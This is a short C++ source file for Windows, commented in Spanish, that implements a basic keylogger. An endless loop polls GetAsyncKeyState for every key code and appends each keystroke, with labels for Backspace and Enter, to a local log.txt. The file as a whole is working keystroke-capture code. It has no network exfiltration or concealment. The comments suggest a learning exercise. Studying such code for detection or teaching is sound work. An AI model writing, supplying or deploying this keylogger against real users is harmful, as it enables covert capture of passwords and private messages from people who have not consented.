#include <iostream>  //para imprimir
#include <fstream>   //para archivos
#include <windows.h> //para windows
void logKey(int key);//AQUI SE REGISTRA LA TECLA PRESIONADA EN UNA VARIABLE PARA QUR TODO FUNCIONE

int main() { //ESTA FUNCION DETECTA LAS TECLAS PRESIONADAS
    while (true) {
        for (int key = 8; key <= 255; key++) { // Captura el rango de teclas 
            if (GetAsyncKeyState(key) & 0x0001) { // Detecta si la tecla fue presionada
                logKey(key); //si la tecla fue presionada la guarda
            }
        }
        Sleep(10); // Reduce el uso de CPU
    }
    return 0;
}

void logKey(int key) { //ESTA FUNCION GUARDA LAS TECLAS PRESIONADAS EN UN ARCHIVO
    std::ofstream logfile("log.txt", std::ios::app); // Abre log.txt en modo agregar
    if (key == VK_BACK) { // usa un if statement para escribir ejemplo si es backspace escribe backspace
        logfile << "[BACKSPACE]";
    } else if (key == VK_RETURN) {
        logfile << "[ENTER]";
    } else if (key == VK_SPACE) {
        logfile << " ";
    } else if (key >= 32 && key <= 126) { // Rango de caracteres imprimibles
        logfile << char(key);
    } else {
        logfile << "[" << key << "]"; // Teclas especiales
    }
    logfile.close();
}
